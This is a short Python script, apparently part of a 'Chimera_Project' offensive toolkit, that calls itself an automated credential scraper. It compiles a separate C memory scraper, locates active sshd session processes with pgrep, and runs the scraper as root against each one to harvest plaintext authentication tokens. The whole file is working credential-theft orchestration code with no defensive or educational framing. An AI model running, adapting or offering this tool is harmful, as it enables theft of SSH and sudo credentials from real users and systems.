#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess
import sys

class TokenHarvester:
    """
    Agent 504: Automated Credential Scraper.
    Identifies high-value authentication processes (sshd, sudo) 
    and injects the memory scraper to harvest plaintext tokens.
    """
    def get_target_pids(self, process_name="sshd"):
        """Actionable: Locate active auth processes."""
        pids = []
        try:
            # We look for SSH sessions actively connected (not just the listener)
            output = subprocess.check_output(["pgrep", "-f", f"{process_name}: "]).decode()
            pids = output.strip().split("\n")
        except: pass
        return pids

    def execute(self):
        print("--- [AGENT 504: CREDENTIAL HARVEST SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/504_Token_Harvester/src/scraper.c"
        bin_out = "/home/dan/Chimera_Project/agents/504_Token_Harvester/src/scraper"
        
        # 1. Compile
        subprocess.run(["gcc", src, "-o", bin_out], check=True)
        
        if os.getuid() != 0:
            print("[!] Critical: Memory scraping requires Root/CAP_SYS_PTRACE.")
            return

        # 2. Locate active SSH sessions
        pids = self.get_target_pids()
        if not pids:
            print("[*] No active user sessions found to scrape.")
            return

        # 3. Inject and Scrape
        for pid in pids:
            if pid:
                subprocess.run([bin_out, pid])

if __name__ == "__main__":
    TokenHarvester().execute()
